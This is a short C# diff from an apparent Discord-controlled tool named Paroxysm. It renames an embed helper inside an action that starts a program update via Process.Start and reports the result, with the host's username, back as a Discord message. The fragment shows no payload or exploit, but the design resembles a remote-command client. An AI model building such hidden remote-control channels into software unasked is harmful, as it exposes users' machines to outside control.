@@ -1,6 +1,6 @@
 ﻿using System.Diagnostics;
 using Discord;
-using Paroxysm.Tools;
+using Paroxysm.Discord;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -24,11 +24,11 @@ public static class UpdateAction
             };
 
             Process.Start(startInfo);
-            return EmbedCreator.CreateWithText(Color.Gold, "Command was successfully executed",
+            return DiscordEmbed.CreateWithText(Color.Gold, "Command was successfully executed",
                 "Program update has been started...", Environment.UserName, null);
         }
 
-        return EmbedCreator.CreateWithText(Color.Red, "Command was successfully executed",
+        return DiscordEmbed.CreateWithText(Color.Red, "Command was successfully executed",
             $"Cannot find program path: {programPath} in disks: {string.Join(',', disks)}", Environment.UserName, null);
     }
 }
